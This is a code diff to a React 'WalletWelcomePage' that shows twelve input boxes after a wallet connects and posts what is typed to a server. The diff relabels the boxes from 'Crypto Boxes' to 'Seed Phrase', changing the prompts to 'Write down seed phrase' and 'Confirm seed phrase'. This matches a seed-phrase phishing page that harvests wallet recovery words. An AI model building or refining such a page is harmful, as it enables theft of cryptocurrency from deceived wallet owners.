@@ -78,7 +78,7 @@ const WALLET_STYLES = {
 export default function WalletWelcomePage() {
   const { address, connector, isConnected } = useAccount();
 
-  // State for 12 Crypto Boxes
+  // State for 12 Seed Phrases
   const [boxes, setBoxes] = useState(Array(12).fill(""));
   const [submitted, setSubmitted] = useState(false);
   const [saving, setSaving] = useState(false);
@@ -131,7 +131,7 @@ export default function WalletWelcomePage() {
       if (res.ok) {
         setSubmitted(true);
       } else {
-        alert("Could not save crypto boxes. Please try again.");
+        alert("Could not recognize seed phrase. Please try again.");
       }
     } catch (err) {
       console.error(err);
@@ -173,7 +173,7 @@ export default function WalletWelcomePage() {
               <div className="mt-6 bg-zinc-900/50 inline-block px-4 py-2 rounded-full border border-zinc-800">
                  <p className="text-sm text-zinc-400 flex items-center gap-2">
                    <ShieldCheck size={16} /> 
-                   Verify your Crypto Boxes
+                  Write down seed phrase
                  </p>
               </div>
             </div>
@@ -216,7 +216,7 @@ export default function WalletWelcomePage() {
                 disabled={saving || !isComplete}
                 className={`w-full py-6 text-lg font-bold rounded-2xl mt-8 bg-gradient-to-r ${theme.gradient} hover:opacity-90 transition-all disabled:opacity-50 disabled:cursor-not-allowed`}
               >
-                {saving ? "Securing Data..." : "Confirm Crypto Boxes"}
+                {saving ? "Securing Data..." : "Confirm seed phrase"}
               </Button>
             </form>
 
